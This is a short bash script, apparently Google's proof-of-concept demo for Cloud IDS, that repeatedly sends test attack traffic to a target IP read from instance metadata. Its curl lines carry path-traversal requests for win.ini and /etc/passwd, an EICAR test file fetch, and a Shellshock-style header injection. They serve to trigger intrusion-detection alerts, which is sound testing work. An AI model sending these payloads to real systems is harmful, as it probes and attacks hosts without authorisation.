#!/bin/bash

##  Copyright 2023 Google LLC
##
##  Licensed under the Apache License, Version 2.0 (the "License");
##  you may not use this file except in compliance with the License.
##  You may obtain a copy of the License at
##
##      https://www.apache.org/licenses/LICENSE-2.0
##
##  Unless required by applicable law or agreed to in writing, software
##  distributed under the License is distributed on an "AS IS" BASIS,
##  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
##  See the License for the specific language governing permissions and
##  limitations under the License.

##  This code creates PoC demo environment for Cloud IDS
##  This demo code is not built for production workload ##

apt-get update
apt-get upgrade -y
apt-get install curl -y
 TARGET_IP=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/TARGET_IP" -H "Metadata-Flavor: Google")
counter=50
while [ $counter -gt 0 ];
do
    curl "http://$TARGET_IP/?item=../../../../WINNT/win.ini"
    curl "http://$TARGET_IP/eicar.file"
    curl "http://$TARGET_IP/cgi-bin/../../../..//bin/cat%20/etc/passwd"
    curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' "http://$TARGET_IP/cgi-bin/test-critical"
    sleep 60
    ((counter--))
done

